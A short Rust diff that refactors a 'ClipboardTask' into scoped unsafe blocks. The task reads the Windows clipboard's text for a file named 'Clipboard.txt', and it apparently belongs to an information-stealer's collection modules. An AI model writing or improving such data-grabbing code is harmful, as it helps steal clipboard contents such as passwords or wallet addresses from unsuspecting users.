@@ -12,34 +12,44 @@ pub(super) struct ClipboardTask;
 impl<C: Collector> Task<C> for ClipboardTask {
     parent_name!("Clipboard.txt");
 
-    unsafe fn run(&self, parent: &Path, _: &C) {
-        if OpenClipboard(null_mut()) == 0 {
+    fn run(&self, parent: &Path, _: &C) {
+        if unsafe {
+            OpenClipboard(null_mut())
+        } == 0 {
             return;
         }
         
-        let handle = GetClipboardData(13u32);
+        let handle = unsafe { GetClipboardData(13u32) };
         if handle.is_null() {
             return;
         }
         
-        let ptr = GlobalLock(handle);
+        let ptr = unsafe { GlobalLock(handle) };
         if ptr.is_null() {
-            CloseClipboard();
+            unsafe {
+                CloseClipboard();
+            }
             return;
         }
         
         let mut len = 0;
         let mut cur = ptr as *const u16;
-        while *cur != 0 {
-            len += 1;
-            cur = cur.add(1);
+        unsafe {
+            while *cur != 0 {
+                len += 1;
+                cur = cur.add(1);
+            }
         }
         
         let slice = slice_from_raw_parts(ptr as *const u16, len);
-        let str = String::from_utf16_lossy(&*slice);
+        let str = unsafe {
+            String::from_utf16_lossy(&*slice)
+        };
         
-        GlobalUnlock(handle);
-        CloseClipboard();
+        unsafe {
+            GlobalUnlock(handle);
+            CloseClipboard();
+        }
         
         let str = str.trim();
         if str.is_empty() {
